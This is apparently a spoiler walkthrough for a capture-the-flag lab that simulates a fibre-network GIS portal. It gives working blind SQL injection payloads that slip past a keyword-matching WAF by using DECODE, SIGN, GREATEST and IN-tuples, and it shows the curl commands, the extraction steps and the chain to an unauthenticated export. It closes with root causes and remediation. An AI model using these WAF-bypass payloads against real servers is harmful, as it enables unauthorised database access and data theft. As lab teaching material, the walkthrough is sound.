# FiberGrid CTF — full walkthrough (SPOILER)

This document solves the lab end to end. It mirrors the reference solver in
`solve/solve.py`; every request below was executed against the lab.

```
target      http://localhost:8080
endpoint    /arcgis/rest/services/KAPSAMA_VEKTOR/MapServer/0/query
backend     Oracle-compatible database (schema CBS, instance LDS_GISDB)
protections F5 ASM-style WAF in front of the whole host
```

---

## 1. Recon

The service directory is public and only lists the coverage layer:

```bash
curl -s 'http://localhost:8080/arcgis/rest/services?f=json'
```

```json
{"currentVersion":10.81,"folders":["Utilities"],"services":[{"name":"KAPSAMA_VEKTOR","type":"MapServer"}]}
```

The portal itself calls `/webservice/api/AddressData/Iller` to populate the
province selector. The response contains internal notes, including an access
key that was never meant to be published:

```bash
curl -s 'http://localhost:8080/webservice/api/AddressData/Iller' | grep -o 'FLAG{[^}]*}'
```

```
FLAG{r3c0n_publ1c_4ddr3ss_d4t4}
```

The 3D root shows the intended authentication story: `/arcgis3d/rest/...`
redirects to the login page while `/arcgis/rest/...` does not. The two roots
disagree about who may query GIS data.

---

## 2. The boolean oracle

`returnCountOnly` turns the query interface into a truth oracle: the endpoint
returns how many records match the `where` clause.

```bash
Q='http://localhost:8080/arcgis/rest/services/KAPSAMA_VEKTOR/MapServer/0/query'
curl -s -G "$Q" --data-urlencode 'where=1=1' \
  --data-urlencode 'returnCountOnly=true' --data-urlencode 'f=json'
# {"count":118427}

curl -s -G "$Q" --data-urlencode 'where=1=2' \
  --data-urlencode 'returnCountOnly=true' --data-urlencode 'f=json'
# {"count":0}
```

A subquery is evaluated as well, which proves the `where` clause is handed to
the database as native SQL:

```bash
curl -s -G "$Q" --data-urlencode 'where=1=(SELECT MIN(OBJECTID) FROM CBS.FWA_NOKTALAR)' \
  --data-urlencode 'returnCountOnly=true' --data-urlencode 'f=json'
# {"count":118427}
```

At this point `sqlmap` and `ghauri` already fail: their templates need
`AND`/comments, which the appliance rejects.

---

## 3. Mapping the WAF

The appliance normalises percent-encoding (including double encoding) and
matches a value-based signature set on every parameter. Ordering, pattern and
positional helpers are blocked as well, so the only practical comparison
channels are arithmetic and equality.

| Payload | Result |
|---|---|
| `1=1 AND 1=1` | `Request Rejected` |
| `1=1 OR 1=1` | `Request Rejected` |
| `1=1--` | `Request Rejected` |
| `1=1 UNION SELECT 1` | `Request Rejected` |
| `(SELECT 1 FROM TAB)` | `Request Rejected` (leading subquery) |
| `COUNT(*)` | `Request Rejected` |
| `MAX(OBJECTID)>0` | `Request Rejected` (comparison operator) |
| `MAX(OBJECTID)<5` | `Request Rejected` (comparison operator) |
| `ACIKLAMA ILIKE 'FLAG%'` | `Request Rejected` (pattern operator) |
| `MAX(OBJECTID) BETWEEN 1 AND 2` | `Request Rejected` |
| `EXISTS(SELECT 1 FROM A90312)` | `Request Rejected` |
| `POSITION('F' IN ACIKLAMA)=1` | `Request Rejected` (position helper) |
| `LPAD(ACIKLAMA,4)='FLAG'`, `OVERLAY(...)` | `Request Rejected` (truncation/replacement oracles) |
| `ACIKLAMA ^@ 'FLAG{'` | `Request Rejected` (PostgreSQL prefix operator) |
| `1=1 LIMIT 1` | `Request Rejected` (PostgreSQL syntax) |
| `ASCII(65)`, `SUBSTR(...)`, `INSTR(...)`, `TRANSLATE(...)` | `Request Rejected` |
| `ALL_TABLES`, `ALL_OBJECTS`, `GLOBAL_NAME`, `SYS_CONTEXT`, `ROWNUM` | `Request Rejected` |
| `DBMS_*`, `UTL_*`, `SLEEP(`, `BENCHMARK(` | `Request Rejected` |
| `1=(SELECT MIN(OBJECTID) FROM CBS.FWA_NOKTALAR)` | passes |
| `DECODE(...)`, `SIGN(...)`, `GREATEST(...)`, `NVL(...)`, `LENGTH(...)` | passes |
| `WHERE (TNAME,COLNO) IN (('GUZERGAH',1))` | passes |

The lesson: the blocklist is lexical. It does not know that

```
1=(SELECT DECODE(SIGN(<expr>-<k>),1,1,-1) FROM <source>)
```

computes a comparison with subtraction and `SIGN`, or that

```
1=(SELECT DECODE(GREATEST(<expr>,'<prefix>'),<expr>,1,-9) FROM <source>)
```

computes an ordering test with `GREATEST`. No boolean keyword, no comment and
no comparison operator is required.

---

## 4. Fingerprint and dictionary

```bash
where=SYS_GUID() IS NOT NULL            # Oracle-only function -> count > 0
where=user='CBS'                         # session schema is CBS
```

The dictionary views that pass the WAF:

```bash
where=1=(SELECT DECODE(SIGN(MIN(USER_ID)-50),1,1,-1) FROM ALL_USERS)
# count 0 -> the smallest ORACLE user_id is <= 50

where=1=(SELECT DECODE(MIN(TNAME),'A90312',1,-9) FROM TAB)    # staging table
where=1=(SELECT DECODE(MAX(TNAME),'GUZERGAH',1,-9) FROM TAB)    # route inventory

where=1=(SELECT DECODE(MIN(CNAME),'OBJECTID',1,-9) FROM COL
         WHERE (TNAME,COLNO) IN (('GUZERGAH',1)))

where=1=(SELECT DECODE(MAX(PROPERTY_VALUE),'LDS_GISDB',1,-9)
         FROM DATABASE_PROPERTIES WHERE PROPERTY_NAME='GLOBAL_DB_NAME')
```

`COL` needs a second condition (the column number). `AND` is blocked, so the
tuple form `IN (('GUZERGAH',1))` carries it instead — exactly the trick the
original engagement used.

---

## 5. Blind extraction

Each value is recovered with two binary searches.

**Length.** Define `L(k)` as the response to

```
where=1=(SELECT DECODE(SIGN(LENGTH(<expr>)-<k>),1,1,-1) FROM <source>)
```

`L(k)` is true exactly when `length > k`. Bisection over `k` converges on the
exact length.

**Characters.** Let `v` be the value and `s` a known prefix. The predicate

```
where=1=(SELECT DECODE(GREATEST(<expr>,'<s>c'),<expr>,1,-9) FROM <source>)
```

is true exactly when `v >= s||c` in binary (ASCII) order. Because the
predicate is monotone in `c`, bisecting over a printable ASCII set finds the
largest character that keeps it true — that character is the next character
of `v`. Iterate until the known length is reached; then verify the result
with a `DECODE(v,'<candidate>',1,-9)` equality check.

The lab database uses the `C` collation, so ordering is byte-wise and
`GREATEST` behaves like Oracle's binary sort.

Reference results (schema `CBS`):

| Expression | Source | Value |
|---|---|---|
| `MIN(TNAME)` | `TAB` | `A90312` |
| `MAX(TNAME)` | `TAB` | `GUZERGAH` |
| `MIN(CNAME)` | `COL` where `(TNAME,COLNO) IN (('GUZERGAH',1))` | `OBJECTID` |
| `MIN(USERNAME)` | `ALL_USERS` | `A680241` |
| `MAX(PROPERTY_VALUE)` | `DATABASE_PROPERTIES` where `PROPERTY_NAME='GLOBAL_DB_NAME'` | `LDS_GISDB` |
| `MIN(ACIKLAMA)` | `A90312` | `FLAG{unpubl1sh3d_st4g1ng_t4bl3}` |
| `MAX(ACIKLAMA)` | `A90312` | `FTTH_ENVANTER_20260814_a91f3c.zip` |

A staging note in `A90312` refers to a special route record. The record is
the last one, so its `OBJECTID` is found numerically first:

```bash
where=1=(SELECT DECODE(SIGN(MAX(OBJECTID)-742317),1,1,-1) FROM GUZERGAH)   # TRUE
where=1=(SELECT DECODE(SIGN(MAX(OBJECTID)-742318),1,1,-1) FROM GUZERGAH)   # FALSE
# -> MAX(OBJECTID) = 742318 exactly
```

Then the note of that specific row is extracted:

```bash
where=1=(SELECT DECODE(GREATEST(NOTLAR,'FLAG{r'),NOTLAR,1,-9)
         FROM GUZERGAH WHERE OBJECTID=742318)
```

```
FLAG{r0ut3_n0t3_0r4cl3_r34d} -> verified as FLAG{r0ut3_n0t3_0r4cl3_r34d}
```

(The `WHERE OBJECTID=742318` inside the subquery adds row targeting without
`AND`.)

---

## 6. The chain

`MAX(ACIKLAMA)` in the staging table is an export archive name. The portal's
export subsystem never checks authentication:

```bash
curl -s 'http://localhost:8080/webservice/api/Export?file=FTTH_ENVANTER_20260814_a91f3c.zip' -o odn.zip
unzip -p odn.zip FTTH_ENVANTER_20260814.csv | head -2
```

```
OLT_KODU,PORT,SPLITTER,UAVT,BBK,IL,ILCE,DURUM,ACIKLAMA
OLT-İST-001,P01,SPL-01,10000000,BBK400000,İSTANBUL,KADIKÖY,BEKLEMEDE,FLAG{un4uth_3xp0rt_4rch1v3}
```

Four flags:

```
FLAG{r3c0n_publ1c_4ddr3ss_d4t4}      recon: internal address data leak
FLAG{unpubl1sh3d_st4g1ng_t4bl3}      blind SQLi: staging table
FLAG{r0ut3_n0t3_0r4cl3_r34d}          blind SQLi: targeted route record
FLAG{un4uth_3xp0rt_4rch1v3}          chain: unauthenticated export archive
```

The reference solver performs all of the above in ~920 HTTP requests and
about 26 seconds on a laptop:

```bash
python3 solve/solve.py
```

---

## 7. Why the protections failed

- **Native SQL passthrough.** The service is configured with standardized
  queries disabled, so the `where` clause is concatenated into the query
  (`SELECT COUNT(*) FROM cbs.fwa_noktalar WHERE (<where>)`). Validation against
  layer fields never happens.
- **No authentication.** The query interface is anonymous; only the 3D root
  redirects to the login page. The two service roots should not differ.
- **Signature-only WAF.** The appliance matches words and operators, not
  semantics. Arithmetic (`SIGN(x-k)`), ordering (`GREATEST`), `DECODE` and
  `IN (...)` tuples are enough to rebuild the familiar boolean oracle.
- **Excessive database privileges.** The application account can read
  `ALL_USERS`, `DATABASE_PROPERTIES` and unrelated schemas.
- **Unauthenticated export subsystem.** Export archive names are secrets in
  practice, but the download endpoint checks only whether the file exists.

## 8. Remediation

1. Enable standardized queries (`useStandardizedQueries:true`) or validate
   `where` against layer fields before it reaches the database.
2. Put `/arcgis/rest/services` behind the same authentication as
   `/arcgis3d/rest`.
3. Run the service under a least-privileged database account; catalog views
   and foreign schemas should not be reachable from the query path.
4. Replace value-based WAF signatures with an allowlist model for this
   virtual host; keep the signature set as defense in depth only.
5. Require authentication and authorization for export generation and
   download, and treat archive names as non-secret identifiers.
